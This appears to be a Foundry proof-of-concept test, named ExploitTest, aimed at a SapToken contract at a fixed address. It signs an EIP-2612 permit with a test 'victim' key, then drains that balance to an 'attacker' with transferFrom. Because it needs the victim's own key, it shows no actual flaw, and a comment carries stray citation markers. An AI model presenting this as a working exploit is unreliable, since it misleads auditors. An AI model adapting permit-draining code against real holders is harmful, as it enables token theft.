pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface SapToken {
    function permit(
        address owner,
        address spender,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function nonces(address owner) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    SapToken token;
    address attacker = address(this);
    address victim = vm.addr(0x1);
    uint256 victimPrivateKey = 0x1;
    // 1000 tokens with 9 decimals
    uint256 victimBalance = 1000 * 1e9;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = SapToken(TARGET);

        // Fund the victim with SAP tokens
        deal(address(token), victim, victimBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 deadline = block.timestamp + 1 days;
        uint256 nonce = token.nonces(victim);

        bytes32 DOMAIN_SEPARATOR;
        // The "Stack too deep" error is caused by having too many local variables.
        // By wrapping variable declarations in scopes {}, we can reuse stack slots
        // and avoid the error. [3, 4, 5]
        {
            // --- Correctly calculate the DOMAIN_SEPARATOR ---
            bytes32 DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
            bytes32 nameHash = keccak256(bytes("Sapphire Token"));
            bytes32 versionHash = keccak256(bytes("1"));
            DOMAIN_SEPARATOR = keccak256(
                abi.encode(
                    DOMAIN_TYPEHASH,
                    nameHash,
                    versionHash,
                    block.chainid,
                    address(token)
                )
            );
            // --- End of calculation ---
        }

        bytes32 digest;
        {
            // The PERMIT_TYPEHASH is a constant in the contract
            bytes32 PERMIT_TYPEHASH = 0x6e71EDAe12b1b97f4d1f60370feF10105Fa2Faae0126114a169c64845d6126c9;

            // Create the permit struct hash
            bytes32 structHash = keccak256(abi.encode(
                PERMIT_TYPEHASH,
                victim,
                attacker,
                victimBalance,
                nonce,
                deadline
            ));

            // Create the EIP-712 digest using the correct DOMAIN_SEPARATOR
            digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));
        }

        {
            // Sign the digest with the victim's private key
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, digest);

            // Use the signature to call permit and get an allowance
            token.permit(victim, attacker, victimBalance, deadline, v, r, s);
        }

        // Verify the allowance was granted
        assertEq(token.allowance(victim, attacker), victimBalance);

        // Transfer the victim's tokens to the attacker
        token.transferFrom(victim, attacker, victimBalance);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
